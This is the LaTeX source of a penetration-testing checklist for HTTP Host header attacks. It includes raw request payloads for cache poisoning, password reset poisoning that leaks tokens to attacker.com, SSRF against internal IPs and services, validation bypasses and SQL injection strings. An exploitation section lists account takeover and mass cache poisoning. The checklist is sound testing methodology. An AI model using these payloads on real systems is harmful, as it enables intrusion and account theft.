\documentclass[12pt,a4paper]{article}
\usepackage[utf8]{inputenc}
\usepackage[T1]{fontenc}
\usepackage{amsmath}
\usepackage{amsfonts}
\usepackage{amssymb}
\usepackage{graphicx}
\usepackage{hyperref}
\usepackage{listings}
\usepackage{xcolor}
\usepackage{geometry}
\usepackage{titlesec}
\usepackage{fancyhdr}
\usepackage{enumitem}
\usepackage{longtable}
\usepackage{array}
\usepackage{booktabs}
\usepackage{tcolorbox}
\usepackage{parskip}
\usepackage{verbatim}

% Page Setup
\geometry{a4paper, margin=1in}
\setlength{\parskip}{1em}
\setlength{\parindent}{0pt}

% Color Definitions
\definecolor{codegreen}{rgb}{0,0.6,0}
\definecolor{codegray}{rgb}{0.5,0.5,0.5}
\definecolor{codepurple}{rgb}{0.58,0,0.82}
\definecolor{backcolour}{rgb}{0.95,0.95,0.92}
\definecolor{note}{rgb}{0.9,0.95,1}
\definecolor{warning}{rgb}{1,0.95,0.9}
\definecolor{danger}{rgb}{1,0.9,0.9}
\definecolor{success}{rgb}{0.9,1,0.9}

% Code Listing Settings
\lstdefinestyle{mystyle}{
    backgroundcolor=\color{backcolour},
    commentstyle=\color{codegreen},
    keywordstyle=\color{codepurple}\bfseries,
    numberstyle=\tiny\color{codegray},
    stringstyle=\color{codegreen},
    basicstyle=\ttfamily\footnotesize,
    breakatwhitespace=false,
    breaklines=true,
    captionpos=b,
    keepspaces=true,
    numbers=left,
    numbersep=5pt,
    showspaces=false,
    showstringspaces=false,
    showtabs=false,
    tabsize=2
}

\lstset{style=mystyle}

% Custom Commands
\newtcolorbox{notebox}{colback=note,colframe=blue!50!black,title=\textbf{Note}}
\newtcolorbox{warningbox}{colback=warning,colframe=orange!50!black,title=\textbf{Warning}}
\newtcolorbox{tipbox}{colback=success,colframe=green!50!black,title=\textbf{Tip}}
\newtcolorbox{vulnerablebox}{colback=danger,colframe=red!50!black,title=\textbf{Vulnerable Example}}
\newtcolorbox{checklistbox}{colback=success,colframe=green!50!black,title=\textbf{Checklist Item}}

\newcommand{\note}[1]{\begin{notebox}#1\end{notebox}}
\newcommand{\warning}[1]{\begin{warningbox}#1\end{warningbox}}
\newcommand{\tip}[1]{\begin{tipbox}#1\end{tipbox}}
\newcommand{\vulnerable}[1]{\begin{vulnerablebox}#1\end{vulnerablebox}}
\newcommand{\checkitem}[1]{\begin{checklistbox}\textbf{✓} #1\end{checklistbox}}

% Title Formatting
\titleformat{\section}{\large\bfseries}{\thesection}{1em}{}
\titleformat{\subsection}{\normalsize\bfseries}{\thesubsection}{1em}{}
\titleformat{\subsubsection}{\small\bfseries}{\thesubsubsection}{1em}{}

% Document Information
\title{
    \vspace{2cm}
    \Huge\textbf{HTTP Host Header Attacks} \\
    \vspace{0.5cm}
    \Large Testing Checklist \& Methodology
    \vspace{1cm}
}
\author{Eyad Islam El-Taher}
\date{\today}

\begin{document}

\maketitle
\tableofcontents
\newpage


\section{Pre-Testing Phase}

\subsection{Initial Setup}
\begin{checklistbox}
 Configure Burp Suite to intercept traffic
\end{checklistbox}
\begin{checklistbox}
 Ensure Burp maintains separation between Host header and target IP
\end{checklistbox}
\begin{checklistbox}
 Identify all application endpoints
\end{checklistbox}
\begin{checklistbox}
 Note any caching headers (Age, Cache-Control, X-Cache)
\end{checklistbox}

\subsection{Information Gathering}
\begin{checklistbox}
 Identify all domains and subdomains
\end{checklistbox}
\begin{checklistbox}
 Check for load balancers and CDN usage
\end{checklistbox}
\begin{checklistbox}
 Review application architecture (if known)
\end{checklistbox}
\begin{checklistbox}
 Identify password reset functionality
\end{checklistbox}
\begin{checklistbox}
 Identify admin panels and restricted areas
\end{checklistbox}

% ============================================================
% SECTION 3: BASIC HOST HEADER TESTS
% ============================================================
\section{Basic Host Header Tests}

\subsection{Arbitrary Host Header Testing}
\begin{lstlisting}[caption=Basic Test Suite]
# Test 1: Arbitrary domain
GET / HTTP/1.1
Host: arbitrary.com

# Test 2: Different case
GET / HTTP/1.1
Host: VULNERABLE.COM

# Test 3: Localhost
GET / HTTP/1.1
Host: localhost

# Test 4: IP address
GET / HTTP/1.1
Host: 127.0.0.1

# Test 5: Invalid characters
GET / HTTP/1.1
Host: vulnerable.com<script>alert(1)</script>
\end{lstlisting}

\subsection{Checklist}
\begin{checklistbox}
 Send request with arbitrary domain
\end{checklistbox}
\begin{checklistbox}
 Observe response status (200, 400, 403, 404)
\end{checklistbox}
\begin{checklistbox}
 Check if domain is reflected in response
\end{checklistbox}
\begin{checklistbox}
 Test with case variations
\end{checklistbox}
\begin{checklistbox}
 Test with localhost and IP addresses
\end{checklistbox}
\begin{checklistbox}
 Test with special characters
\end{checklistbox}

% ============================================================
% SECTION 4: VALIDATION BYPASS TESTS
% ============================================================
\section{Validation Bypass Tests}

\subsection{Port Manipulation}
\begin{lstlisting}[caption=Port Injection Tests]
# Numeric port
GET / HTTP/1.1
Host: vulnerable.com:9999

# Non-numeric port
GET / HTTP/1.1
Host: vulnerable.com:malicious

# Port with injection
GET / HTTP/1.1
Host: vulnerable.com:'<a href="//attacker.com/?
\end{lstlisting}

\subsection{Subdomain Tricks}
\begin{lstlisting}[caption=Subdomain Tests]
# Whitelist bypass
GET / HTTP/1.1
Host: notvulnerable-website.com

# Compromised subdomain
GET / HTTP/1.1
Host: hacked-subdomain.vulnerable.com

# DNS suffix matching
GET / HTTP/1.1
Host: evil.vulnerable-website.com
\end{lstlisting}

\subsection{Checklist}
\begin{checklistbox}
 Test numeric port injection
\end{checklistbox}
\begin{checklistbox}
 Test non-numeric port injection
\end{checklistbox}
\begin{checklistbox}
 Test subdomain whitelist bypass
\end{checklistbox}
\begin{checklistbox}
 Test DNS suffix matching
\end{checklistbox}
\begin{checklistbox}
 Check if port is reflected in response
\end{checklistbox}

% ============================================================
% SECTION 5: MULTIPLE HEADER TESTS
% ============================================================
\section{Multiple Host Header Tests}

\subsection{Testing Methods}
\begin{lstlisting}[caption=Multiple Header Tests]
# Two different hosts
GET / HTTP/1.1
Host: vulnerable.com
Host: attacker.com

# Case manipulation
GET / HTTP/1.1
Host: vulnerable.com
HoSt: attacker.com

# Duplicate headers
GET / HTTP/1.1
Host: vulnerable.com
Host: vulnerable.com

# Three or more
GET / HTTP/1.1
Host: first.com
Host: second.com
Host: third.com
\end{lstlisting}

\subsection{Checklist}
\begin{checklistbox}
 Test with two different Host headers
\end{checklistbox}
\begin{checklistbox}
 Test with case-manipulated headers
\end{checklistbox}
\begin{checklistbox}
 Test with duplicate headers
\end{checklistbox}
\begin{checklistbox}
 Observe which header takes precedence
\end{checklistbox}
\begin{checklistbox}
 Check for differences in validation vs routing
\end{checklistbox}

% ============================================================
% SECTION 6: HOST OVERRIDE HEADER TESTS
% ============================================================
\section{Host Override Header Tests}

\subsection{Override Headers to Test}
\begin{longtable}{|p{4cm}|p{6cm}|p{4cm}|}
    \hline
    \textbf{Header} & \textbf{Example} & \textbf{Status} \\
    \hline
    X-Forwarded-Host & X-Forwarded-Host: attacker.com & Test \\
    \hline
    X-Host & X-Host: attacker.com & Test \\
    \hline
    X-Forwarded-Server & X-Forwarded-Server: attacker.com & Test \\
    \hline
    X-HTTP-Host-Override & X-HTTP-Host-Override: attacker.com & Test \\
    \hline
    Forwarded & Forwarded: host=attacker.com & Test \\
    \hline
\end{longtable}

\subsection{Checklist}
\begin{checklistbox}
 Test X-Forwarded-Host
\end{checklistbox}
\begin{checklistbox}
 Test X-Host
\end{checklistbox}
\begin{checklistbox}
 Test X-Forwarded-Server
\end{checklistbox}
\begin{checklistbox}
 Test X-HTTP-Host-Override
\end{checklistbox}
\begin{checklistbox}
 Test Forwarded header
\end{checklistbox}
\begin{checklistbox}
 Check if any header overrides Host
\end{checklistbox}

% ============================================================
% SECTION 7: AMBIGUOUS REQUEST TESTS
% ============================================================
\section{Ambiguous Request Tests}

\subsection{Testing Techniques}
\begin{lstlisting}[caption=Ambiguous Request Tests]
# Absolute URL method
GET https://vulnerable.com/ HTTP/1.1
Host: attacker.com

# Line wrapping (indented header)
GET / HTTP/1.1
    Host: attacker.com
Host: vulnerable.com

# Protocol variations
GET http://vulnerable.com/ HTTP/1.1
Host: attacker.com

# Malformed request line
GET @private-intranet/example HTTP/1.1
\end{lstlisting}

\subsection{Checklist}
\begin{checklistbox}
 Test absolute URL method
\end{checklistbox}
\begin{checklistbox}
 Test line wrapping with indented headers
\end{checklistbox}
\begin{checklistbox}
 Test different protocols (http:// vs https://)
\end{checklistbox}
\begin{checklistbox}
 Test malformed request line (@ symbol)
\end{checklistbox}
\begin{checklistbox}
 Observe differences between front-end and back-end processing
\end{checklistbox}

% ============================================================
% SECTION 8: CACHE POISONING TESTS
% ============================================================
\section{Cache Poisoning Tests}

\subsection{Testing Procedure}
\begin{lstlisting}[caption=Cache Poisoning Test Sequence]
# Step 1: Establish baseline
GET /?cb=123 HTTP/1.1
Host: vulnerable.com

# Step 2: Attempt poisoning
GET /?cb=123 HTTP/1.1
Host: vulnerable.com
Host: attacker.com

# Step 3: Verify poisoning
GET /?cb=123 HTTP/1.1
Host: vulnerable.com

# Step 4: Check cache headers
# Look for: X-Cache, Age, Cache-Control
\end{lstlisting}

\subsection{Checklist}
\begin{checklistbox}
 Identify cacheable endpoints
\end{checklistbox}
\begin{checklistbox}
 Note cache headers (Age, Cache-Control)
\end{checklistbox}
\begin{checklistbox}
 Use unique cache buster for each test
\end{checklistbox}
\begin{checklistbox}
 Check if Host header reflected in cached response
\end{checklistbox}
\begin{checklistbox}
 Verify cache hit with same buster
\end{checklistbox}
\begin{checklistbox}
 Test with ambiguous requests for cache poisoning
\end{checklistbox}

% ============================================================
% SECTION 9: PASSWORD RESET TESTS
% ============================================================
\section{Password Reset Tests}

\subsection{Testing Procedure}
\begin{lstlisting}[caption=Password Reset Test Sequence]
# Step 1: Submit password reset
POST /forgot-password HTTP/1.1
Host: vulnerable.com
username=test@email.com

# Step 2: Attempt poisoning
POST /forgot-password HTTP/1.1
Host: vulnerable.com:'<a href="//attacker.com/?
username=test@email.com

# Step 3: Check email content
# Look for: Links using injected host
# Raw HTML vs rendered view
\end{lstlisting}

\subsection{Checklist}
\begin{checklistbox}
 Identify password reset functionality
\end{checklistbox}
\begin{checklistbox}
 Check email generation and sending
\end{checklistbox}
\begin{checklistbox}
 Analyze email content (raw HTML)
\end{checklistbox}
\begin{checklistbox}
 Test Host header injection in reset link
\end{checklistbox}
\begin{checklistbox}
 Test dangling markup injection
\end{checklistbox}
\begin{checklistbox}
 Check if sanitization (DOMPurify) can be bypassed
\end{checklistbox}
\begin{checklistbox}
 Verify token exfiltration via logs
\end{checklistbox}

% ============================================================
% SECTION 10: SSRF TESTS
% ============================================================
\section{SSRF Tests}

\subsection{Testing Procedure}
\begin{lstlisting}[caption=SSRF Test Sequence]
# Step 1: Collaborator detection
GET https://vulnerable.com/ HTTP/1.1
Host: BURP-COLLABORATOR.net

# Step 2: Internal IP scanning
GET https://vulnerable.com/ HTTP/1.1
Host: 192.168.0.1
Host: 10.0.0.1
Host: 172.16.0.1

# Step 3: Access internal services
GET https://vulnerable.com/ HTTP/1.1
Host: 192.168.0.1:6379   # Redis
Host: 192.168.0.1:5432   # PostgreSQL
Host: 192.168.0.1:3306   # MySQL
\end{lstlisting}


\subsection{Checklist}
\begin{checklistbox}
 Test with Burp Collaborator
\end{checklistbox}
\begin{checklistbox}
 Scan internal IP ranges (192.168.x.x, 10.x.x.x)
\end{checklistbox}
\begin{checklistbox}
 Test for admin panels on internal IPs
\end{checklistbox}
\begin{checklistbox}
 Test internal service ports
\end{checklistbox}
\begin{checklistbox}
 Test cloud metadata endpoints (169.254.169.254)
\end{checklistbox}
\begin{checklistbox}
 Check for SSRF via absolute URL
\end{checklistbox}
\begin{checklistbox}
 Check for SSRF via malformed request line
\end{checklistbox}

% ============================================================
% SECTION 11: CONNECTION STATE TESTS
% ============================================================
\section{Connection State Tests}

\subsection{Testing Procedure}
\begin{lstlisting}[caption=Connection State Test Sequence]
# Tab 1: Validation request
GET / HTTP/1.1
Host: vulnerable.com
Connection: keep-alive

# Tab 2: Exploitation request (same connection)
GET /admin HTTP/1.1
Host: 192.168.0.1
Connection: keep-alive
\end{lstlisting}

\subsection{Checklist}
\begin{checklistbox}
 Set Connection: keep-alive
\end{checklistbox}
\begin{checklistbox}
 Send valid request first (establishes connection)
\end{checklistbox}
\begin{checklistbox}
 Send malicious request on same connection
\end{checklistbox}
\begin{checklistbox}
 Check if validation is bypassed
\end{checklistbox}
\begin{checklistbox}
 Use "Send group in sequence" in Burp
\end{checklistbox}

% ============================================================
% SECTION 12: VIRTUAL HOST BRUTE-FORCING
% ============================================================
\section{Virtual Host Brute-Forcing}

\subsection{Common Subdomains Wordlist}
\begin{lstlisting}[caption=Wordlist for Brute-Forcing]
admin
administrator
management
control
intranet
internal
corporate
staff
employee
dev
development
staging
test
qa
uat
dashboard
portal
panel
console
backend
api
api-gateway
services
microservices
cdn
assets
static
media
files
mail
email
smtp
webmail
exchange
jenkins
gitlab
github
bitbucket
jira
monitoring
grafana
prometheus
kibana
database
db
mysql
postgres
redis
vpn
vpn-gateway
remote
remote-access
cloud
cloud-admin
aws
azure
gcp
\end{lstlisting}

\subsection{Checklist}
\begin{checklistbox}
 Use Burp Intruder for brute-forcing
\end{checklistbox}
\begin{checklistbox}
 Test common subdomains
\end{checklistbox}
\begin{checklistbox}
 Compare response status codes
\end{checklistbox}
\begin{checklistbox}
 Check for different applications served
\end{checklistbox}
\begin{checklistbox}
 Look for internal/private networks
\end{checklistbox}

% ============================================================
% SECTION 13: SQL INJECTION TESTS
% ============================================================
\section{SQL Injection Tests}

\subsection{Testing Procedure}
\begin{lstlisting}[caption=SQL Injection Tests]
# Basic injection
Host: vulnerable.com' OR '1'='1

# Blind injection
Host: vulnerable.com' AND SLEEP(5)--

# Error-based
Host: vulnerable.com' AND 1=CONVERT(int, @@version)--

# Union-based
Host: vulnerable.com' UNION SELECT username,password FROM users--
\end{lstlisting}

\subsection{Checklist}
\begin{checklistbox}
 Test basic SQL injection
\end{checklistbox}
\begin{checklistbox}
 Test blind SQL injection
\end{checklistbox}
\begin{checklistbox}
 Observe error messages
\end{checklistbox}
\begin{checklistbox}
 Test time-based injection
\end{checklistbox}
\begin{checklistbox}
 Check for database errors in response
\end{checklistbox}

% ============================================================
% SECTION 14: EXPLOITATION CHECKLIST
% ============================================================
\section{Exploitation Checklist}

\subsection{Cache Poisoning Exploitation}
\begin{checklistbox}
 Identify reflected Host header
\end{checklistbox}
\begin{checklistbox}
 Use cache buster to isolate
\end{checklistbox}
\begin{checklistbox}
 Poison with malicious content
\end{checklistbox}
\begin{checklistbox}
 Verify poisoning with same buster
\end{checklistbox}
\begin{checklistbox}
 Remove buster for mass poisoning
\end{checklistbox}

\subsection{Password Reset Exploitation}
\begin{checklistbox}
 Identify password reset functionality
\end{checklistbox}
\begin{checklistbox}
 Inject malicious Host header
\end{checklistbox}
\begin{checklistbox}
 Check raw email content
\end{checklistbox}
\begin{checklistbox}
 Steal reset token/password
\end{checklistbox}
\begin{checklistbox}
 Perform account takeover
\end{checklistbox}

\subsection{SSRF Exploitation}
\begin{checklistbox}
 Confirm SSRF via Collaborator
\end{checklistbox}
\begin{checklistbox}
 Scan internal IP ranges
\end{checklistbox}
\begin{checklistbox}
 Access internal services
\end{checklistbox}
\begin{checklistbox}
 Access admin panels
\end{checklistbox}
\begin{checklistbox}
 Perform admin actions
\end{checklistbox}



% ============================================================
% SECTION 16: SUMMARY CHECKLIST
% ============================================================
\section{Master Summary Checklist}

\begin{longtable}{|p{2cm}|p{8cm}|p{2cm}|}
    \hline
    \textbf{Phase} & \textbf{Action} & \textbf{Status} \\
    \hline
    1 & Configure Burp Suite & \\
    \hline
    2 & Identify application endpoints & \\
    \hline
    3 & Test arbitrary Host header & \\
    \hline
    4 & Test validation bypasses & \\
    \hline
    5 & Test multiple headers & \\
    \hline
    6 & Test override headers & \\
    \hline
    7 & Test ambiguous requests & \\
    \hline
    8 & Test cache poisoning & \\
    \hline
    9 & Test password reset & \\
    \hline
    10 & Test SSRF & \\
    \hline
    11 & Test connection state & \\
    \hline
    12 & Brute-force virtual hosts & \\
    \hline
    13 & Test SQL injection & \\
    \hline
    14 & Document findings & \\
    \hline
    15 & Report vulnerabilities & \\
    \hline
\end{longtable}

% ============================================================
% SECTION 17: REPORTING TEMPLATE
% ============================================================

\end{document}